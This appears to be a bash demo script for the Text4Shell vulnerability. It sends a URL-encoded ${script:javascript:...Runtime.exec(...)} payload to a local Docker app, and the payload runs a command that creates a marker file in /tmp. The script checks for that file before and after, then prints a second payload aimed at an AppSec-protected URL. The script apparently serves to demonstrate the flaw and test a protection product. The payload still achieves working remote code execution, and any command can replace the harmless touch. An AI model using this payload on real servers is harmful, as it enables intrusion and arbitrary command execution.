#!/bin/bash

date
docker exec -it text4shell sh -c 'rm /tmp/fanto*'
echo 'did Fantomas visit your app? BEFORE exploit'
docker exec -it text4shell sh -c 'ls -l /tmp/fanto*'

echo 'exploiting by HTTP request on 8080 - doing touch /tmp/fantomas-was-here'
curl http://localhost:8080/text4shell/attack?search=%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29.exec%28%27touch%20%2Ftmp%2Ffantomas-was-here%27%29%7D

echo 
echo 'AFTER exploit'
echo 'did Fantomas visit your app?'
docker exec -it text4shell sh -c 'ls -l /tmp/fanto*'

echo
echo "now try to reach server via AppSec on ${APP_URL}/text4shell/attack?search=%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29.exec%28%27touch%20%2Ftmp%2FUser-was-here%27%29%7D"
echo '...and check AppSec log'
date